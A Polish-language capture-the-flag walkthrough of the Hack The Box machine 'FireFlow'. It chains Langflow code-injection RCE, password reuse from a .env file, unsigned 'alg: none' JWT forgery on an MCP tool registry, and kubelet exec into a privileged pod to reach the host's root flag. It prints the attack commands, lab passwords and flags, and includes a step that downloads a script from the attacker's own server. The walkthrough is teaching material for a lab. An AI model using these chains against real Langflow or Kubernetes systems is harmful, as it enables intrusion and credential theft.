# FireFlow (10.129.244.214) — pełny opis ataku od zera

Ten plik jest dla Ciebie: **krok po kroku**, prostym językiem, z komendami i wyjaśnieniem *dlaczego* coś robimy.  
Nie musisz znać Kubernetes na start — na końcu jest słowniczek.

**Flagi (box rozwiązany):**
- User: `48ee923b3fbffb37621a852be3f6103f`
- Root: `8445f907efe003ebce43fedb14420d69`

**Skrót ścieżki:**
```
Internet → Langflow (RCE) → www-data na hoście
         → hasła z .env → SSH nightfall → user flag
         → MCP (słaby JWT) → kod Pythona w „narzędziach” → RCE w podzie
         → token Kubernetes → kubelet exec → privileged pod → root flag na hoście
```

---

## 0. Przygotowanie (Kali)

### VPN Hack The Box
Bez VPN nie widzisz maszyny w labie.

```bash
# przykład (EU machines) — u Ciebie może być inna ścieżka .ovpn
echo 'wasd' | su - ctf -c 'sudo openvpn --config /home/kali/Downloads/machines_eu-1.ovpn --daemon --log /tmp/htb-openvpn.log'
ip -br a | grep tun0
```

**Co to robi:** `tun0` z adresem typu `10.10.x.x` = jesteś w sieci HTB.

### /etc/hosts — żeby nazwy z certyfikatu działały

Na serwerze są dwa „serwisy WWW” pod różnymi nazwami (vhosty):

```bash
echo '10.129.244.214 fireflow.htb flow.fireflow.htb' | sudo tee -a /etc/hosts
```

**Dlaczego:** nginx rozróżnia strony po nagłówku `Host`. Bez wpisu w hosts przeglądarka/curl nie trafi w Langflow.

### Folder roboczy

```bash
mkdir -p ~/Desktop/htb/FireFlow/{nmap,loot,scripts}
```

---

## 1. Rozpoznanie (recon)

### Skan portów

```bash
echo 'wasd' | su - ctf -c 'sudo nmap -sC -sV -oA ~/Desktop/htb/FireFlow/nmap/initial 10.129.244.214'
```

**Wynik (istotne):**
| Port | Usługa |
|------|--------|
| 22 | SSH |
| 443 | HTTPS (nginx) |
| inne (9100, 30000, …) | często **filtered** z zewnątrz — na hoście mogą słuchać tylko lokalnie / w klastrze |

**Filtered** = firewall nie odpowiada — nie wiemy „open/closed”, ale z Kali często **nie da się** tam wejść bezpośrednio.

### Co to za box (fabuła techniczna)

- **`fireflow.htb`** — statyczna strona „Task Force Nightfall”.
- **`flow.fireflow.htb`** — **Langflow 1.8.2** (platforma do flow AI; proxy z nginx na `127.0.0.1:7860`).
- Na hoście działa też **K3s** (mały Kubernetes) — m.in. pod **MCP** na porcie **30080** (NodePort), ale z internetu często **timeout**.

---

## 2. Foothold — RCE przez Langflow (bez logowania)

### Idea w jednym zdaniu

Langflow pozwala **publicznie** uruchomić gotowy flow (`build_public_tmp`). W body żądania można podmienić **kod komponentu** w flow — i ten kod wykonuje się na serwerze jako użytkownik usługi Langflow: **`www-data`**.

### Pliki u nas

- `loot/public_flow.json` — kopia publicznego flow (UUID flow w URL playground).
- `scripts/build_public_rce.py` — automatyzacja ataku.

### Komenda (dowolna komenda na serwerze)

```bash
python3 ~/Desktop/htb/FireFlow/scripts/build_public_rce.py --quiet 'id'
```

**Co robi skrypt (uproszczone):**
1. Wczytuje JSON flow z dysku.
2. W komponencie `TextOperations` wkleja do metody `process_text()` wywołanie `subprocess.run(TWOJA_KOMENDA, shell=True)`.
3. Wysyła `POST https://10.129.244.214/api/v1/build_public_tmp/<FLOW_ID>/flow` z nagłówkiem `Host: flow.fireflow.htb` i ciasteczkiem `client_id=...`.
4. Czyta odpowiedź (stream zdarzeń) i wyciąga tekst wyniku (`--quiet`).

**Przykłady enumeracji jako www-data:**

```bash
python3 ~/Desktop/htb/FireFlow/scripts/build_public_rce.py --quiet 'cat /etc/langflow/.env'
python3 ~/Desktop/htb/FireFlow/scripts/build_public_rce.py --quiet 'hostname; whoami; pwd'
python3 ~/Desktop/htb/FireFlow/scripts/build_public_rce.py --quiet 'ss -tlnp | head -30'
```

### Ręczny curl (gdybyś chciał zrozumieć bez Pythona)

Logika jest taka sama: cookie `client_id`, POST z JSON zawierającym zmodyfikowany graf flow. Skrypt jest wygodniejszy, bo sam wstrzykuje kod i parsuje odpowiedź.

---

## 3. Eskalacja do użytkownika — hasła z `.env`

### Co znaleźliśmy

Plik **`/etc/langflow/.env`** (czytelny dla www-data):

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=...
```

To **hasło superusera Langflow** — na tym boxie **to samo** działa dla użytkownika systemowego **`nightfall`** (typowy HTB: reuse haseł).

### SSH jako nightfall

```bash
ssh nightfall@10.129.244.214
# hasło: n1ghtm4r3_b4_n1ghtf4ll
```

Lub z Kali bez interakcji:

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh -o StrictHostKeyChecking=no nightfall@10.129.244.214 'id; cat user.txt'
```

**User flag:** w `/home/nightfall/user.txt` → `48ee923b3fbffb37621a852be3f6103f`

### Logowanie do Langflow (API) — opcjonalnie, do admina WWW

```bash
curl -sk --compressed -H 'Host: flow.fireflow.htb' \
  'https://10.129.244.214/api/v1/login' \
  -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=langflow&password=n1ghtm4r3_b4_n1ghtf4ll'
```

Dostajesz `access_token` JWT do API Langflow (przydatne do flow/admin, nie do roota samo w sobie).

### Co nightfall **nie** ma

- **Brak sudo** (nawet z hasłem).
- Nie czyta `/opt/lab/firewall.sh` (plik root, chmod 700).
- Nie w grupie `docker`.
- **`~/.mcp/config.json`** — wskazówka do następnego kroku:

```json
{
  "server": "http://10.129.244.214:30080",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

MCP = **MCP AI Tool Registry** (serwis w klastrze K8s).

---

## 4. MCP — słabe JWT i „wgranie” kodu Pythona

### Co to jest MCP na tym boxie?

Mały serwer **FastAPI** (`loot/mcp-main.py` — dało się wyciągnąć przez RCE w podzie).  
Trzyma w pamięci **sklep narzędzi** (`TOOL_STORE`). Każde narzędzie to **string z kodem Pythona**, który przy wywołaniu uruchamia:

```text
python3 -c <TWÓJ_KOD>
```

stdin = JSON z argumentami wywołania. Wynik wraca tylko z **`print()`** na stdout.

### Endpointy

| Metoda | Ścieżka | Kto |
|--------|---------|-----|
| POST | `/api/v1/auth` | login → JWT |
| GET | `/api/v1/tools` | lista narzędzi |
| POST | `/api/v1/tools` | **rejestracja narzędzia — wymaga roli admin** |
| POST | `/mcp` | JSON-RPC `tools/call` — wywołanie narzędzia |

Z **nightfall** serwis jest pod ręką:

```bash
curl -s http://127.0.0.1:30080/api/v1/version
```

Z Kali na `10.129.244.214:30080` często **nie działa** (firewall) — dlatego SSH na nightfall lub tunel.

### Błąd bezpieczeństwa: JWT `alg: none`

Serwer akceptuje token admina **bez podpisu**:

```python
# payload: {"sub":"admin","role":"admin"}
# nagłówek: {"alg":"none","typ":"JWT"}
# token: <header>.<payload>.   (pusta „sygnatura”)
```

Albo normalny login admina (z kodu źródłowego):

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"nightfall-admin","password":"4dm1n@NightfallOps!"}'
```

### „Upload” — nie ma multipart; jest `POST /api/v1/tools`

**Nie ma** endpointu typu „wyślij plik”. Zamiast tego wysyłasz JSON:

```json
{
  "name": "moje_narzedzie",
  "description": "test",
  "code": "import os\nprint(os.getcwd())"
}
```

Nagłówek: `Authorization: Bearer <token_admina>`.

Potem użytkownik **`langflow-bot`** wywołuje przez `/mcp`:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {"name": "moje_narzedzie", "arguments": {}}
}
```

### Skrypt pomocniczy na Kali (przez SSH nightfall → MCP na localhost)

```bash
python3 ~/Desktop/htb/FireFlow/scripts/mcp_exploit.py \
  --name test --code 'import os; print(os.getlogin() if hasattr(os,"getlogin") else "mcp"); print(open("/etc/hostname").read())'
```

**Co robi `mcp_exploit.py`:**
1. Łączy się SSH jako `nightfall`.
2. Na hoście odpala Pythona, który:
   - bierze token admina (`alg: none`),
   - rejestruje narzędzie (`POST /api/v1/tools`),
   - loguje bota i robi `tools/call` (`POST /mcp`),
   - wypisuje wynik.

**Efekt:** RCE w **podzie Kubernetes** jako użytkownik **`mcp`** (uid 1000), **nie** root na fizycznym hoście.

### Wgranie pliku `.py` do poda (jak w writeupie z HTTP server)

```bash
# opcja A: nasz skrypt „upload”
python3 ~/Desktop/htb/FireFlow/scripts/mcp_upload_run.py \
  ~/Desktop/htb/FireFlow/scripts/kube_exec.py

# opcja B: writeup — na Kali:
# cd ~/Desktop/htb/FireFlow/scripts && python3 -m http.server 8000
# w kodzie narzędzia MCP: urllib.request.urlretrieve('http://TWOJE_IP_HTB:8000/kube_exec.py', '/tmp/kube_exec.py')
```

---

## 5. Kubernetes — co ten pod ma za uprawnienia?

W każdym podzie K8s jest plik:

```text
/var/run/secrets/kubernetes.io/serviceaccount/token
```

To token konta serwisowego **`mcp-sa`** w namespace `default`.

### Sprawdzenie (z narzędzia MCP)

```bash
python3 ~/Desktop/htb/FireFlow/scripts/mcp_exploit.py --name rbac --code '
import json,urllib.request,ssl
tok=open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
ctx=ssl.create_default_context(cafile="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
body={"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}
req=urllib.request.Request("https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
  data=json.dumps(body).encode(), headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}, method="POST")
r=json.loads(urllib.request.urlopen(req,context=ctx).read())
for rule in r["status"]["resourceRules"]:
    print(rule)
'
```

**W praktyce `mcp-sa` ma tylko:**
- `get` na **`nodes/proxy`** — możesz przez API serwera K8s robić zapytania HTTP do **kubelet** na węźle (u nas node nazywa się **`fireflow`**).
- **Nie ma** `pods/exec`, `secrets`, listowania podów przez API itd.

### Ale kubelet z tego samego poda…

Z poda MCP token często działa też **bezpośrednio** na:

```text
https://fireflow:10250/pods
```

Stąd widać **wszystkie pody na maszynie**, w tym:

```text
monitoring/prometheus-prometheus-node-exporter-nmntq
  privileged: true
  hostPath: /, /proc, /sys
  w kontenerze mount: /host/root  →  to jest dysk hosta (root filesystem)
```

**Flaga root na hoście:** `/root/root.txt`  
**W tym kontenerze:** `/host/root/root/root.txt`

---

## 6. Root — kubelet exec (to zadziałało na końcu)

### Dlaczego nie wystarczył MCP RCE?

Pod MCP to **osobna „maszyna wirtualna”** w klastrze — nie widzi `/root` hosta.  
Potrzebujesz wejść do kontenera, który ma **cały dysk hosta** zamontowany i działa jako **privileged**.

### Ważny detal parametrów URL (k3s)

Źle (dostawałem HTTP 400):

```text
?stdout=1&stderr=1
```

Dobrze (z writeupu / kubelet na FireFlow):

```text
?output=1&error=1&command=cat&command=/host/root/root/root.txt
```

Połączenie: **WebSocket** `wss://`, subprotokół `v4.channel.k8s.io`, nagłówek `Authorization: Bearer <token mcp-sa>`.

### Skrypt `kube_exec.py`

```bash
# sensowne uruchomienie: WEWNĄTRZ poda MCP (tam jest token i sieć do fireflow:10250)
# z Kali na 10.129.244.214:10250 zwykle NIE (port filtrowany)

python3 ~/Desktop/htb/FireFlow/scripts/kube_exec.py 'cat /host/root/root/root.txt'
```

U nas wygodnie było odpalić logikę skryptu **przez `mcp_exploit.py`** (kod asyncio w polu `code` narzędzia), bo nie trzeba było ręcznie kopiować pliku do poda.

**Wynik root:** `8445f907efe003ebce43fedb14420d69`

### Jedna komenda „na sucho” — co się dzieje

1. Admin MCP rejestruje narzędzie z kodem, który łączy się z kubeletem.
2. Bot wywołuje narzędzie.
3. Kubelet odpala `cat /host/root/root/root.txt` **w kontenerze node-exporter** (root w tym mount namespace).
4. `print()` zwraca flagę do odpowiedzi MCP → widzisz ją w terminalu na Kali.

---

## 7. Lista komend — „ściąga” w kolejności ataku

```bash
# --- przygotowanie ---
echo '10.129.244.214 fireflow.htb flow.fireflow.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -oA ~/Desktop/htb/FireFlow/nmap/initial 10.129.244.214

# --- foothold www-data ---
python3 ~/Desktop/htb/FireFlow/scripts/build_public_rce.py --quiet 'id'
python3 ~/Desktop/htb/FireFlow/scripts/build_public_rce.py --quiet 'cat /etc/langflow/.env'

# --- user nightfall ---
ssh nightfall@10.129.244.214
# hasło: n1ghtm4r3_b4_n1ghtf4ll
cat ~/user.txt

# --- MCP z nightfall (localhost) ---
curl -s http://127.0.0.1:30080/api/v1/version
curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'

# --- RCE w podzie MCP z Kali ---
python3 ~/Desktop/htb/FireFlow/scripts/mcp_exploit.py --name x --code 'import subprocess; r=subprocess.run("id",shell=True,capture_output=True,text=True); print(r.stdout)'

# --- root (kube_exec w podzie / przez mcp_exploit) ---
python3 ~/Desktop/htb/FireFlow/scripts/kube_exec.py 'cat /host/root/root/root.txt'
```

Hasła i flagi też w: `loot/copy-paste.txt`

---

## 8. Słowniczek (żeby „prawie nic nie rozumieć” zmieniło się w „rozumiem mapę”)

| Słowo | Znaczenie na tym boxie |
|--------|-------------------------|
| **Langflow** | Aplikacja do budowania flow AI; tu miała publiczny endpoint budowania flow → RCE. |
| **www-data** | Użytkownik Linux, pod którym działa nginx/Langflow na **hoście**. |
| **vhost** | Jedna IP, wiele stron — rozróżnienie po `Host:` (`fireflow.htb` vs `flow.fireflow.htb`). |
| **K3s / Kubernetes** | Orkiestrator kontenerów; na FireFlow aplikacja MCP działa **w podzie**. |
| **Pod** | Jedna „instancja” kontenera w K8s — jak lekka VM. |
| **MCP** | Rejestr narzędzi AI; admin wkleja kod Pythona, bot go wywołuje. |
| **JWT** | Token dostępu; tu błąd: algorytm `none` = admin bez podpisu. |
| **Service Account (mcp-sa)** | Tożsamość poda w K8s; token w pliku w podzie. |
| **nodes/proxy** | Uprawnienie: „możesz pytać kubelet na węźle przez API”. |
| **Kubelet** | Agent K8s na hoście, port **10250** — m.in. **exec** do kontenerów. |
| **Privileged pod** | Kontener z prawie pełnymi uprawnieniami; tu + mount całego `/` hosta. |
| **node-exporter** | DaemonSet Prometheus do metryk; tu wykorzystany jako „okno” na dysk hosta. |
| **NodePort 30080** | Port MCP wystawiony z klastra; z internetu często zablokowany, z nightfall `127.0.0.1:30080` działa. |

---

## 9. Co poszło nie tak u mnie (zanim zadziałał writeup) — żebyś wiedział, że to normalne

1. Szukałam roota w samym podzie MCP (`cat /root/root.txt`) — **zły filesystem**.
2. Próbowałam `stdout=1` zamiast **`output=1`** — kubelet odrzucał WebSocket.
3. Próbowałam `:10250` z Kali — **firewall HTB**.
4. Myślałam o `firewall.sh` — **red herring** (ciekawy temat, nie ścieżka flagi).

Ty z writeupem trafiłeś w **kubelet + node-exporter** — to jest właściwy finał.

---

## 10. Pliki w tym katalogu — co do czego

| Plik | Opis |
|------|------|
| `PELNY-OPIS-ATAKU.md` | Ten dokument. |
| `notes.md` | Krótsze notatki techniczne. |
| `loot/copy-paste.txt` | Flagi, hasła, szybkie komendy. |
| `loot/mcp-sa-rbac.md` | Uprawnienia tokena mcp-sa. |
| `loot/mcp-main.py` | Wyciekły kod serwera MCP. |
| `scripts/build_public_rce.py` | Langflow RCE. |
| `scripts/mcp_exploit.py` | Rejestracja + wywołanie narzędzia MCP przez SSH nightfall. |
| `scripts/kube_exec.py` | Exec przez kubelet (root flag). |
| `scripts/mcp_upload_run.py` | Wgranie lokalnego `.py` do `/tmp` w podzie MCP. |

---

Jeśli chcesz, w następnym kroku możemy przejść **tylko jedną sekcję** (np. sam MCP albo sam Kubernetes) i rozrysować to jak na tablicy — bez nowych komend, samo „co do kogo dzwoni”.